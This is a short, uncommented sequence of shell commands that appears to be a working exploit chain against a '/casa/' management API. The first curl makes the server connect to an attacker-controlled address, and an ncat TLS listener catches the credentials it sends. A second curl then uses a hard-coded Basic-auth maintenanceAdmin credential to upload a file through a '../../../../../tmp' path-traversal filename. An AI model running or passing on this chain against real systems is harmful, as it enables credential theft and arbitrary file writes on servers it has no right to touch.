curl -k https://192.168.123.185/casa/nodes/thumbprints -H "Content-Type: application/json" -d '["192.168.123.1:8443/#"]'

ncat -lkv --ssl 8443

curl -kH "Authorization: Basic bWFpbnRlbmFuY2VBZG1pbjpSZmRzeEsvNU00TVNrMnNpMTc0S0loRFY=" https://192.168.123.185/casa/private/config/slice/ha/certificate -F name=../../../../../tmp/vulnerable -F "file=@-; filename=vulnerable" <<<vulnerable
